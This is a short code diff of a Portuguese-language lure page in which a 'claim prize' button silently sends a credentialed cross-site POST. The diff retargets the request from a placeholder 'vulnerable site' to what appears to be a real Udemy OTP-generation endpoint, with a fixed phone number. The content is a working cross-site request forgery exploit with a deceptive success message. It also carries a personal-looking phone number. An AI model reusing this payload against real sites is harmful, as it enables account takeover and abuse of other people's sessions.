@@ -43,14 +43,14 @@
         document.getElementById('claim-button').addEventListener('click', function() {
             // Cria e submete o formulário malicioso quando o usuário clicar
             var xhr = new XMLHttpRequest();
-                xhr.open('POST', 'https://site-vulneravel.com/api/atualizar-telefone', true);
+                xhr.open('POST', 'https://www.udemy.com/api-2.0/auth/non-auth-otp/generate/', true);
                 xhr.withCredentials = true;
                 xhr.setRequestHeader('Content-Type', 'application/json');
                 xhr.send(JSON.stringify({
                     "purpose": 3,
                     "phone_number": "+5514996810417"
                 }));
-            
+            console.log(">>",xhr)
             // Mostra mensagem de sucesso
             this.textContent = "Prêmio Resgatado!";
             this.disabled = true;
